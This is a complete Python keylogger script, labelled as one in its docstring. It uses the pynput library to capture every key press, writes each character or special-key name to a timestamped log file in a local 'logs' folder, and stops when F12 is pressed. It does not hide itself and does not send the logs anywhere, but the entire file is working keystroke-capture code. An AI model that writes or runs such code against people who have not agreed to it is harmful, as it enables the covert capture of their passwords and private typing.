"""
Simple keylogger
Tracks keystrokes and saves it into a file dated to when the program started
"""

import os
import sys
import time
from pynput import keyboard

# Creating file to store keys
if not os.path.exists("logs"):
    os.makedirs("logs")
DATE = time.strftime("log-%Y-%m-%d_%H-%M-%S")

# Given a key, writes it to a file
def on_key_press(key):
    # Log key
    try:
        # Text Key
        file = open("logs/" + DATE + ".txt", "a")
        file.write(key.char)
        file.close()
    except AttributeError:
        # Adjustment Key
        file = open("logs/" + DATE + ".txt", "a")
        file.write("[{0}]".format(key))
        file.close()
    except TypeError:
        # Custom Key
        file = open("logs/" + DATE + ".txt", "a")
        file.write("[Custom: {0}]".format(key))
        file.close()

    # Stop keylogger
    if key == keyboard.Key.f12:
        sys.exit()

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
